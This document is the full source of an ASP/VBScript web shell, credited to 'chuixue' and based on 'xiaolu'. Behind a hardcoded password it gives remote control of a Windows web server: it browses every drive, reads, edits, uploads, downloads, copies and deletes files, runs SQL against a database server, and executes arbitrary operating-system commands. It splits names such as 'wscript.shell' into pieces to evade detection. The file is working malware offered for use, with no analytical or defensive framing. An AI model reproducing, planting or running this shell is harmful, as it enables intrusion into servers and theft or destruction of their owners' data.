<%@language=vbscript.encode  codepage ="936"%>
<%server.scripttimeout=6000%>
<object runat=server id=ssyss scope=page classid="clsid:0d43fe01-f093-11cf-8940-00a0c9054228"></object>
<%on error resume next
dim data_xlsf
class upload_xlsf
dim oform,objfile,version
public function form(sform)
sform=lcase(sform)
if not oform.exists(sform) then
form=""
else
form=oform(sform)
end if
end function
public function file(strfile)
strfile=lcase(strfile)
if not objfile.exists(strfile) then
set file=new fileinfo
else
set file=objfile(strfile)
end if
end function
private sub class_initialize 
dim requestdata,sstart,vbcrlf,sinfo,iinfostart,iinfoend,tstream,istart,thefile
dim ifilesize,sfilepath,sfiletype,sformvalue,sfilename
dim ifindstart,ifindend
dim iformstart,iformend,sformname
version="xiaolu"
set oform=server.createobject("scripting.dictionary")
set objfile=server.createobject("scripting.dictionary")
if request.totalbytes<1 then exit sub
set tstream = server.createobject("adodb.stream")
set data_xlsf = server.createobject("adodb.stream")
data_xlsf.type = 1
data_xlsf.mode =3
data_xlsf.open
data_xlsf.write  request.binaryread(request.totalbytes)
data_xlsf.position=0
requestdata =data_xlsf.read
iformstart = 1
iformend = lenb(requestdata)
vbcrlf = chrb(13) & chrb(10)
sstart = midb(requestdata,1, instrb(iformstart,requestdata,vbcrlf)-1)
istart = lenb (sstart)
iformstart=iformstart+istart+1
while (iformstart + 10) < iformend 
iinfoend = instrb(iformstart,requestdata,vbcrlf & vbcrlf)+3
tstream.type = 1
tstream.mode =3
tstream.open
data_xlsf.position = iformstart
data_xlsf.copyto tstream,iinfoend-iformstart
tstream.position = 0
tstream.type = 2
tstream.charset ="gb2312"
sinfo = tstream.readtext
tstream.close
iformstart = instrb(iinfoend,requestdata,sstart)
ifindstart = instr(22,sinfo,"name=""",1)+6
ifindend = instr(ifindstart,sinfo,"""",1)
sformname = lcase(mid (sinfo,ifindstart,ifindend-ifindstart))
if instr (45,sinfo,"filename=""",1) > 0 then
set thefile=new fileinfo
ifindstart = instr(ifindend,sinfo,"filename=""",1)+10
ifindend = instr(ifindstart,sinfo,"""",1)
sfilename = mid (sinfo,ifindstart,ifindend-ifindstart)
thefile.filename=getfilename(sfilename)
thefile.filepath=getfilepath(sfilename)
ifindstart = instr(ifindend,sinfo,"content-type: ",1)+14
ifindend = instr(ifindstart,sinfo,vbcr)
thefile.filetype =mid (sinfo,ifindstart,ifindend-ifindstart)
thefile.filestart =iinfoend
thefile.filesize = iformstart -iinfoend -3
thefile.formname=sformname
if not objfile.exists(sformname) then
objfile.add sformname,thefile
end if
else
tstream.type =1
tstream.mode =3
tstream.open
data_xlsf.position = iinfoend 
data_xlsf.copyto tstream,iformstart-iinfoend-3
tstream.position = 0
tstream.type = 2
tstream.charset ="gb2312"
sformvalue = tstream.readtext 
tstream.close
if oform.exists(sformname) then
oform(sformname)=oform(sformname)&", "&sformvalue		  
else
oform.add sformname,sformvalue
end if
end if
iformstart=iformstart+istart+1
wend
requestdata=""
set tstream =nothing
end sub
private sub class_terminate  
if request.totalbytes>0 then
oform.removeall
objfile.removeall
set oform=nothing
set objfile=nothing
data_xlsf.close
set data_xlsf =nothing
end if
end sub
private function getfilepath(fullpath)
if fullpath <> "" then
getfilepath = left(fullpath,instrrev(fullpath, "\"))
else
getfilepath = ""
end if
end  function
private function getfilename(fullpath)
if fullpath <> "" then
getfilename = mid(fullpath,instrrev(fullpath, "\")+1)
else
getfilename = ""
end if
end  function
end class
class fileinfo
dim formname,filename,filepath,filesize,filetype,filestart
private sub class_initialize 
filename = ""
filepath = ""
filesize = 0
filestart= 0
formname = ""
filetype = ""
end sub
public function saveas(fullpath)
dim dr,errorchar,i
saveas=true
if trim(fullpath)="" or filestart=0 or filename="" or right(fullpath,1)="/" then exit function
set dr=createobject("adodb.stream")
dr.mode=3
dr.type=1
dr.open
data_xlsf.position=filestart
data_xlsf.copyto dr,filesize
dr.savetofile fullpath,2
dr.close
set dr=nothing 
saveas=false
end function
end class
httpt = request.servervariables("server_name")
rseb=request.servervariables("script_name")
d=request("d")
if request.cookies("password")<>"123456789" then 
if trim(request.form("password"))="123456789" then 
response.cookies("password")="123456789" 
response.redirect rseb & "?d=ls.asp"
else 
%>
<form method="post" action="">
password£º<input type="password" name="password"> 
<input type="submit" value="login" name="b1">
</form>
<%
end if
response.end
end if 
select case d
case "d.asp"
call downloadfile(request("path"))
function downloadfile(strfile)
strfilename = strfile
response.buffer = true
response.clear%>
<object runat=server id=s scope=page classid="clsid:00000566-0000-0010-8000-00aa006d2ea4"></object>
<%s.open
s.type = 1
if not ssyss.fileexists(strfilename) then
response.write("<h1>error:</h1>" & strfilename & " does not exist<p>")
response.end
end if
set f = ssyss.getfile(strfilename)
intfilelength = f.size
s.loadfromfile(strfilename)
if err then
response.write("<h1>error: </h1>" & err.description & "<p>")
response.end
end if
response.addheader "content-disposition", "attachment; filename=" & f.name
response.addheader "content-length", intfilelength
response.charset = "utf-8"
response.contenttype = "application/octet-stream"
response.binarywrite s.read
response.flush
s.close
set s = nothing
response.end
end function 
case "ls.asp"
urlpath=server.urlencode(path)
dim cpath,lpath
if request("path")="" then
lpath="/"
else
lpath=request("path")&"/"
end if
if request("attrib")="true" then
cpath=replace(lpath,"/","\")
attrib="true"
else
cpath=server.mappath(lpath)
attrib=""
end if
sub getfolder()
dim thefolder,thesubfolders
if ssyss.folderexists(cpath)then
set thefolder=ssyss.getfolder(cpath)
set thesubfolders=thefolder.subfolders
response.write"<a href='" & rseb & "?d=ls.asp&path="&request("oldpath")&"&attrib="&attrib&"'>ÉÏ¼¶Ä¿Â¼</a><br><script language=vbscript>"
for each x in thesubfolders
%>so "<%=lpath%>","<%=x.name%>","<%=request("path")%>","<%=attrib%>"
<%next%>
</script>
<%
end if
end sub
sub getfile()
dim thefiles
if ssyss.folderexists(cpath)then
set thefolder=ssyss.getfolder(cpath)
set thefiles=thefolder.files
response.write"<table border='0' width='100%' cellpadding='0'><script language=vbscript>" 
for each x in thefiles
if request("attrib")="true" then
showstring=x.name
else
showstring=x.name
end if%>sf "<%=showstring%>","<%=x.size%>","<%=x.type%>","<%=x.attributes%>","<%=x.datelastmodified%>","<%=lpath%>","<%=x.name%>","<%=attrib%>","<%=x.name%>"
<% 
next
end if
response.write"</script></table>"
end sub
%>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=gb2312">
<title><%=httpt%></title>
<style type="text/css">
<!--
body{font-size: 12px }
a{font-size: 12px; color: rgb(0,32,64); text-decoration: none }
a:hover{color: rgb(255,0,0); text-decoration: none }
a:visited{ color: rgb(128,0,0) }
td{font-size: 12px; line-height: 140%;}
a{color: #000000; text-decoration: none}
a:hover {text-decoration: underline}
-->
</style>
</head>
<script language="javascript">
function crf(ls)
{if (ls==""){alert("name?");}
else {window.open("<%=rseb%>?d=e.asp&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crd(ls)
{if (ls==""){alert("name?");}
else {window.open("<%=rseb%>?d=edir.asp&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub sf(showstring,size,type1,attributes,datelastmodified,lpath,xname,attrib,name)
document.write "<tr onmouseover=""this.style.backgroundcolor = '#c6cddf'"" onmouseout=""this.style.backgroundcolor='#e8f3ff'""><td width='55%'><a href='"& urlpath & lpath & xname &"' target='_blank' title='type:" & type1 & chr(10) & "attri:" & attributes & chr(10) & "time:" & datelastmodified &"'><strong>" & showstring & "</strong></a></td><td width='20%' align='right'>" & size & "b</td><td width='25%' align='right'><a href='<%=rseb%>?d=e.asp&path=" & lpath & xname & "&attrib=" & attrib &"' target='_blank' >±à¼­</a>|<a href="&chr(34)&"javascript: rmd1('"& lpath & xname &"')"&chr(34)&">É¾³ý</a>|<a href='#' onclick=cfile('" & lpath & name & "')>¸´ÖÆ</a>|<a href='<%=rseb%>?d=d.asp&path=<%=cpath%>\"&xname&"&attrib=" & attrib &"' target='_blank'>ÏÂÔØ</a></td></tr>"
end sub
sub so(lpath,xname,path,attrib)
document.write "<a href='<%=rseb%>?d=ls.asp&path="& lpath & xname & "&oldpath=" & path & "&attrib=" & attrib &"'>" & xname &"</a> <a href="&chr(34)&"javascript: rmd('"& lpath & xname &"')"&chr(34)&">É¾³ý</a><br>"
end sub
sub rmd1(ls)
if confirm("really del:"&ls)   then
window.open("<%=rseb%>?d=e.asp&path=" & ls & "&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub rmd(ls)
if confirm("really del:"&ls)   then
window.open("<%=rseb%>?d=edir.asp&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub cfile(sfile)
dfile=inputbox("copy"&chr(13)&chr(10)&"file:"&sfile&chr(13)&chr(10)&"input file name:")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then 
if instr(dfile,":") or instr(dfile,"/")=1 then
lp=""
if instr(dfile,":") and attrib<>"true" then
alert "path mode error:"&dfile
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open("<%=rseb%>?d=e.asp&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"name?"
end if
end sub
</script>
<body>
<table border="1" width="770" cellpadding="4" bordercolorlight="#999999" bordercolordark="#ffffff" align="center" cellspacing="0">
<tr>
<td bgcolor="#c8e3ff" colspan="2" align="center"><b><%=httpt%></b></td>
</tr>
<tr>
<td bgcolor="#eeeeee" colspan="2">
<%for each thing in ssyss.drives
response.write "[<a href='" & rseb & "?d=ls.asp&path="&thing.driveletter&":&attrib=true'>"&thing.driveletter&":</a>]"
next
set oscriptnet=server.createobject("ws"+"cri"+"pt.ne"+"twork")
%>&nbsp;user:<%= "\\" & oscriptnet.computername & "\" & oscriptnet.username %></td>
</tr>
<tr>
<td bgcolor="#eeeeee" colspan="2">
<%if request("attrib")="true"  then
response.write "<a href='" & rseb & "?d=ls.asp'>ÇÐ»»µ½¾ø¶ÔÂ·¾¶</a>"
else
response.write "<a href='" & rseb & "?attrib=true&d=ls.asp'>ÇÐ»»µ½Ïà¶ÔÂ·¾¶</a>"
end if
%>  rpath:<%=cpath%> | cdir:<%=lpath%></td>
</tr>
<form name="form1" method="post" action="<%=rseb%>?d=up.asp" target="_blank" enctype="multipart/form-data">
<tr><td bgcolor="#eeeeee" colspan="2">
<input type="text" name="fname" size="20">
<input type="button" value="½¨ÎÄ¼þ" onclick="crf(form1.fname.value)">
<input type="button" value="½¨Ä¿Â¼" onclick="crd(form1.fname.value)">
<input type="file" name="file1" style="width:150" value="">
<input type="text" name="filepath" value="<%=cpath%>">
<input type="hidden" name="act" value="upload">
<input type="hidden" name="upcount" value="1">
<input type="submit" value="ÉÏ´«">
<input type="button" onclick="window.open('<%=rseb%>?d=p.asp','_blank')"  value="nfso">
<input type="button" onclick="window.open('<%=rseb%>?d=sql.asp','_blank')"  value="sql">
</td>
</tr></form>
<tr>
<td width="180" valign="top" bgcolor="#dfefff"><%call getfolder()%>
</td>
<td width="590" valign="top" bgcolor="#e8f3ff"><%call getfile()%>
</td>
</tr>
</table>
<p align="center">modified by chuixue base on xiaolu</p>
</body>
</html>
<%case "e.asp"%>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=gb2312">
<title>edit</title>
<style>
<!--
table{font-size: 12px}
a{font-size: 12px; color: rgb(0,32,64); text-decoration: none }
a:hover{color: rgb(255,0,0); text-decoration: underline }
a:visited{color: rgb(128,0,0) }
-->
</style>
</head>
<body>
<%if request("op")="del"  then
if request("attrib")="true" then
wfile=request("path")
else
wfile=server.mappath(request("path"))
end if 
set thisfile = ssyss.getfile(wfile)
thisfile.delete true
response.write "<script>alert('del succ!');window.close();</script>"
else
if request("op")="copy" then
if request("attrib")="true" then
wfile=request("path")
dsfile=request("dpath")
else
wfile=server.mappath(request("path"))
dsfile=server.mappath(request("dpath"))
end if 
set thisfile = ssyss.getfile(wfile)
thisfile.copy dsfile
%>
<script language=vbscript>
msgbox "file:<%=wfile%>" & vbcrlf & "to:<%=dsfile%>" & vbcrlf & "copy succ!"
window.close()
</script>
<%
else
if request.form("text")="" then
if request("creat")<>"yes" then
if request("attrib")="true" then
wfile=request("path")
else
wfile=server.mappath(request("path"))
end if 
set thisfile = ssyss.opentextfile(wfile, 1, false)
counter=0
thisline=thisfile.readall
thisfile.close
set fs=nothing
end if
%>
<form method="post" action="<%=rseb%>?d=e.asp">
<input type="hidden" name="attrib" value="<%=request("attrib")%>">
<table border="0" width="760" cellpadding="0" align="center">
<tr>
<td width="100%">file:<input type="text" name="path" size="45" value="<%=request("path")%>"> <input type="submit" value="save" name="b1"><input type="reset" value="reset" name="b2"></td>
</tr>
<tr>
<td width="100%"><textarea rows="30" name="text" cols="104"><%=editfilecontent(thisline)%></textarea></td>
</tr>
</table>
</form>
<%else
if request("attrib")="true" then
wfile=request("path")
else
wfile=server.mappath(request("path"))
end if 
set outfile=ssyss.createtextfile(wfile)
outfile.writeline request("text")
utfile.close 
set fs=nothing
response.write "<script>alert('edit succ!');window.close();</script>"
end if
end if
end if
%>
</body>
</html>
<%case "edir.asp"
if request("op")="del"  then
if request("attrib")="true" then
wdir=request("path")
else
wdir=server.mappath(request("path"))
end if 
ssyss.deletefolder wdir,true
response.write "<script>alert('del dir:" & replace(wdir,"\","\\") & " succ!');window.close();</script>"
else
if request("op")="creat"  then
if request("attrib")="true" then
wdir=request("path")
else
wdir=server.mappath(request("path"))
end if 
ssyss.createfolder wdir
response.write "<script>alert('create dir:" & replace(wdir,"\","\\") & " succ!');window.close();</script>"
end if
end if
case "up.asp"
set upload=new upload_xlsf
if upload.form("filepath")="" then
htmend "input up path!"
set upload=nothing
response.end
else
formpath=upload.form("filepath")
if right(formpath,1)<>"/" then formpath=formpath&"/" 
end if
for each formname in upload.objfile
set file=upload.file(formname)
if file.filesize>0 then
file.saveas formpath & file.filename
response.write file.filepath&file.filename&" ("&file.filesize&") => "&formpath&file.filename&" succ!<br>"
end if
set file=nothing
next
set upload=nothing
sub htmend(msg)
set upload=nothing
response.write "up succ!"
response.end
end sub
case "sql.asp"
if trim(request.form("sqlcmd"))<>""  then
password= trim(request.form("pa"))
id=trim(request.form("id"))
sqllocalname=trim(request.form("sqllocalname"))
ku=trim(request.form("ku"))
session("sqlu")=id
session("sqlp")=password
session("sqls")=sqllocalname
session("sqlc")=trim(request.form("sqlcmd"))
session("sqlk")=ku
if sqllocalname="" or sqllocalname="sql server" then sqllocalname="127.0.0.1"
set adoconn=server.createobject("adodb.connection") 
adoconn.open "provider=sqloledb.1;password="&password&";user id="&id&";database="&ku&";data source ="&sqllocalname
strquery = session("sqlc")
set recresult = adoconn.execute(strquery) 
if left(strquery,4)="exec" or left(strquery,6)="select" then
if not recresult.eof then 
for i=0 to recresult.fields.count-1
strresultn=strresultn&"<td>"&recresult.fields(i).name&"</td>"
next
allre="<table border=1 cellspacing=0 cellpadding=4 style='font-size:12px'><tr bgcolor=#cccccc>"&strresultn&"</tr><tr bgcolor=#eeeeee>"
do while not recresult.eof
for i=0 to recresult.fields.count-1
strresult = strresult &"<td>"& outcmd(recresult.fields(i).value)&"</td>" 
next
allre=allre&strresult&"</tr><tr bgcolor=#eeeeee>"
strresult=""
recresult.movenext 
loop 
allre=allre&"</tr></table>"
end if 
end if
set recresult = nothing 
end if 
set adoconn = nothing 
%>
<form name="form" method=post action="<%=rseb%>?d=sql.asp"> 
<table border=0 cellspacing=0 cellpadding=4 style='font-size:12px'>
<tr><td>
<input type="text" name="sqlcmd" size="80" value="<%=session("sqlc")%>"><br>
<input type="text" name="id" value="<%if session("sqlu")="" then%>uid<%else%><%response.write session("sqlu") end if%>">
<input type="text" name="pa" value="<%if session("sqlp")="" then%>pwd<%else%><%response.write session("sqlp") end if%>">
<input type="text" name="ku" value="<%if session("sqlk")="" then%>master<%else%><%response.write session("sqlk") end if%>">
<input type="text" name="sqllocalname" size=30 value="<%if session("sqls")="" then%>sql server<%else%><%response.write session("sqls") end if%>">
<input type="submit" value="exec">
</td></tr></table>
</form>
<%response.write request.form("sqlcmd") & "<br>" 
response.write allre  
case "p.asp"%>
<html>
<title>nfso</title>
<style>
<!--
body{font-size: 12px}
td{font-size: 12px}
-->
</style>
<body bgcolor="#f4f4f4">
<form action="<%= request.servervariables("url") %>?d=p.asp" name=qgcmd method="post">
<%response.write "path:"&request.servervariables("appl_physical_path")%>
<table border=0 cellspacing=0 cellpadding=4>
<tr><td>path: <input type=text name=text value="<%=esnxa %>"> browse dir</td></tr>
<tr><td>copy: <input type=text name=text1 value="<%=esnxa1 %>"> to <input type=text name=text2 value="<%=esnxa2 %>"></td></tr>
<tr><td>move: <input type=text name=text3 value="<%=esnxa3 %>"> to <input type=text name=text4 value="<%=esnxa4 %>"></td></tr>
<tr><td>path: <input type=text name=text5 value="<%=esnxa5 %>" > prog: <input type=text name=text6 value="<%=esnxa6 %>" > no parameters</td></tr>
<tr><td><input type="text" name="ok" size=55 value="<%=session("qg_cmd")%>"> command</td></tr>
</table>
<input type=submit name=sb value=send>
</form>
</body>
</html>
<%set oscript=server.createobject("wsc"+"ri"+"pt.sh"+"ell")
ok=trim(request("ok"))
if ok<>"" then
response.write "<script>parent.document.qgcmd.ok.value='"&replace(ok,"\","\\")&"';</script>"
set re=oscript.exec (ok)
re=re.stdout.readall
re=outcmd(re) 
response.write re
end if
esnxa = request.form("text")
if (esnxa <> "")  then
set shell=server.createobject("she"+"ll.app"+"lication")
set fod1=shell.namespace(esnxa)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
esnxa1 = request.form("text1")
esnxa2 = request.form("text2")
if esnxa1<>"" and esnxa2<>"" then
set shell1=server.createobject("she"+"ll.app"+"lication")
set fod1=shell1.namespace(esnxa2)
for i=len(esnxa1) to 1 step -1
if mid(esnxa1,i,1)="\" then
path=left(esnxa1,i-1)
exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(esnxa1,len(esnxa1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command success!"
end if
esnxa3 = request.form("text3")
esnxa4 = request.form("text4")
if esnxa3<>"" and esnxa4<>"" then
set shell2=server.createobject("she"+"ll.app"+"lication")
set fod1=shell2.namespace(esnxa4)
for i=len(esnxa3) to 1 step -1
if mid(esnxa3,i,1)="\" then
path=left(esnxa3,i-1)
exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(esnxa3,len(esnxa3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
esnxa5 = request.form("text5")
esnxa6 = request.form("text6")
if esnxa5<>"" and esnxa6<>"" then
set shell3=server.createobject("she"+"ll.app"+"lication")
shell3.namespace(esnxa5).items.item(esnxa6).invokeverb
response.write "command completed success!"
end if
end select
function outcmd(re)
re = replace(re," ","&nbsp;") 
re = replace(re,"<","&lt;") 
re = replace(re,">","&gt;") 
re = replace(re,chr(13),"<br>")
outcmd=re
end function
function editfilecontent(re)
re = replace(re,"<","&lt;") 
re = replace(re,">","&gt;") 
editfilecontent=re
end function
%>ÿÿÿ